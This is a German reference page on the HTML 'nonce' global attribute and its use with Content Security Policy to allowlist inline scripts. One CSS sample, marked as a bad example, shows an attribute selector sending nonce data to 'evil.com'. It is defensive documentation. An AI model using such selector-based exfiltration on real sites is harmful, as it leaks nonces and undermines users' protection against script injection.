---
title: "`nonce` HTML-Globalattribut"
short-title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: 9c70c6ff09189cad43d40e241fbd2fe67349c3c2
---

Das **`nonce`** [Globale Attribut](/de/docs/Web/HTML/Reference/Global_attributes)
ist ein Inhaltsattribut, das eine kryptografische {{Glossary("Nonce", "Nonce")}} ("Nummer nur einmal verwendet") definiert, die von
der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet werden kann, um zu bestimmen, ob ein bestimmter Abruf
für ein bestimmtes Element zugelassen wird.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um bestimmte Elemente wie ein bestimmtes Inline-Skript oder Stilelemente auf die Positivliste zu setzen.
Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/Guides/CSP)-Direktive `unsafe-inline` zu vermeiden, die _alle_ Inline-Skripte oder -Stile auf die Positivliste setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine Möglichkeit haben, unsichere Inline-Skript-
> oder Style-Inhalte zu vermeiden. Wenn Sie kein `nonce` benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen einen CSP-Hash verwenden.
> (Siehe Nutzungshinweise zu [unsicherem Inline-Skript](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, den vollen Vorteil von [CSP](/de/docs/Web/HTTP/Guides/CSP)-Schutzmaßnahmen zu nutzen und Nonces oder unsichere Inline-Skripte wann immer möglich zu vermeiden.

### Verwendung von nonce, um ein \<script>-Element auf die Positivliste zu setzen

Es gibt einige Schritte, um ein Inline-Skript mit dem Nonce-Mechanismus auf die Positivliste zu setzen:

#### Werte generieren

Von Ihrem Webserver generieren Sie einen zufälligen base64-kodierten String mit mindestens 128 Bits an Daten aus einem kryptografisch sicheren
Zufallsgenerator. Nonces sollten jedes Mal anders generiert werden, wenn die Seite geladen wird (Nonce nur einmal!). Zum Beispiel in nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Inline-Skript auf die Positivliste setzen

Das im Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Positivliste setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Versand eines Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) Header senden
(vorangehend `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Verbergen von Nonces

Aus Sicherheitsgründen ist das `nonce`-Inhaltsattribut verborgen (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce) Eigenschaft ist die einzige Möglichkeit, auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen von Nonces hilft zu verhindern, dass Angreifer Nonce-Daten über Mechanismen exfiltrieren, die Daten
aus Inhaltsattributen abrufen können, wie in diesem Beispiel:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
